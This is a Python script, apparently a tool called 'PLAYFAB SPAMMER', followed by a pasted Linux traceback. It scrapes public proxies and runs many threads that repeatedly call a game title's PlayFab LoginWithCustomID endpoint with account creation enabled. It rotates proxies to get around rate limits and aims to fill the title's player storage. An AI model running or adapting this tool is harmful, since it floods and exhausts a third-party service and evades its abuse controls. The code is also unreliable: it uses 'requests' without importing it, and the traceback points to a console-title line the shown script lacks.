import random
import time
import threading
import colorama
from colorama import *
import os
import os
import ctypes
import ast

errir = print(f"{Fore.WHITE} [{Fore.RED}ERROR{Fore.WHITE}]{Fore.RESET} ")
sucess = print(f"{Fore.WHITE} [{Fore.GREEN}SUCCESS{Fore.WHITE}]{Fore.RESET} ")
consol = print(f"{Fore.WHITE} [{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} ")

init(convert=True)
print(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} LOADING MODULES AND ASSETS")

print ("Getting Proxies")
url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
proxget = requests.get(url=url)
proxlist = proxget.text.splitlines()
print ("Found Proxies")

spamming = False
accpersec = 0

threadsready = False

workingproxies = 0

def cache_proxies(proxies):
  with open("cache_proxies.txt", "w") as w:
    w.write(str(proxies))
    w.close()

def read_cached_proxies():
  with open("cache_proxies.txt", "r") as readFile:
    proxies = readFile.read()
    readFile.close()
    return(proxies)
  
cache_proxlist = ast.literal_eval(read_cached_proxies())

def get_http_proxy(index):
    retproxy = proxlist[index]
    return(retproxy)

def get_cached_proxy(index):
  retproxy = cache_proxlist[index]
  return(retproxy)

def spamPlayfab(titleID, prefix, spamProxy, useCache):
  global workingproxies
  global accpersec
  global threadsready
  while 1 == 1:
    if threadsready:
      playfabAPIRoute = "https://{title_id}.playfabapi.com/Client/LoginWithCustomID".format(
        title_id=titleID)
      cid = "{prefix}{random}".format(prefix=prefix,random=str(random.randint(0, 999999)))
      payload = {
        "TitleId": titleID,
        "CreateAccount": True,
        "CustomId": cid
      }

      proxies = {
        "http" : spamProxy,
        "https" : spamProxy
      }

      try:
        response = requests.post(
          url=playfabAPIRoute,
          json=payload,
          proxies=proxies
        )
      except:
        if useCache:
          badProxy = spamProxy in cache_proxlist
          del cache_proxlist[badProxy]
          cache_proxies(cache_proxlist)
        else:
          badProxy = spamProxy in proxlist
          del proxlist[badProxy]
          cache_proxies(proxlist)
        workingproxies -= 1
        break

      responseJson = response.json()
        
      time.sleep(0.35)


      if responseJson['code'] == 200:
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}SUCCESS{Fore.WHITE}]{Fore.RESET} ACCOUNT CREATED : {responseJson['data']['EntityToken']['Entity']['Id']}  WITH CUSTOM ID:  {cid}\n".format(accid=responseJson['data']['EntityToken']['Entity']['Id'], customid=cid, proxy=spamProxy))
        print(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET}  Amount Of Accounts Spammed: {accpersec}\n".format(acc_sec=accpersec))
        accpersec += 1
      if responseJson['code'] == 429:
        print(f"{Fore.WHITE}[{Fore.RED}ERROR{Fore.WHITE}]{Fore.RESET}| {spamProxy} Has Been rate Limited Or The Current Playfab Storage IS FULL\n".format(proxy=spamProxy))
      elif 'error' in responseJson:
        if responseJson['error'] == 'EvaluationModePlayerCountExceeded':
          print("Playfab Is Full")
        else:
          print("error:\n%s"%str(responseJson))

def main(titleid, prefix, useCache):
  global workingproxies
  global threadsready
  spamThreads = []
  if useCache:
    cache = True
    print("got {proxyamt} proxies".format(proxyamt=len(cache_proxlist)))
    workingproxies = len(cache_proxlist)
    proxAmt = len(cache_proxlist)
  else:
    cache = False
    print("got {proxyamt} proxies".format(proxyamt=len(proxlist)))
    workingproxies = len(proxlist)  
    proxAmt = len(proxlist)
  print("MAKING THREADS")
  for i in range(proxAmt):
    if useCache:
      randProxy = get_cached_proxy(i)
    else:
      randProxy = get_http_proxy(i)
    spamThreads.append(threading.Thread(target=spamPlayfab, args=(titleid,prefix,randProxy,cache,)))
  print("Starting Threads")
  threadsready = True
  for thread in spamThreads:
    print(f"Thread Started: {thread}".format(thread=thread))
    thread.start()
  print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}SUCCESS{Fore.WHITE}]{Fore.RESET}  All threads ready!")


time.sleep(3)





spammerscrim = f"""

{Fore.LIGHTBLACK_EX}
{Fore.LIGHTWHITE_EX}    ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒
{Fore.LIGHTBLACK_EX}  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
{Fore.LIGHTWHITE_EX}  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
{Fore.LIGHTBLACK_EX}   ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░  
{Fore.LIGHTWHITE_EX}         ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
{Fore.LIGHTBLACK_EX}         ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
{Fore.LIGHTWHITE_EX}  ░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                            
                                                            

                                              
                                              

                                                                                                          



"""

os.system('cls')
print(spammerscrim)

titleid = str(input(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} Title ID TO Spam: "))
pref = input(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} Custom ID: ")
cacheProxy = False
main(titleid, pref, cacheProxy)
spamming = True

localhost:~/playfab-fuck# python3 main.py
Traceback (most recent call last):
  File "/root/playfab-fuck/main.py", line 12, in <module>
    ctypes.windll.kernel32.SetConsoleTitleW(f'11gn PLAYFAB SPAMMER | V1')
AttributeError: module 'ctypes' has no attribute 'windll'
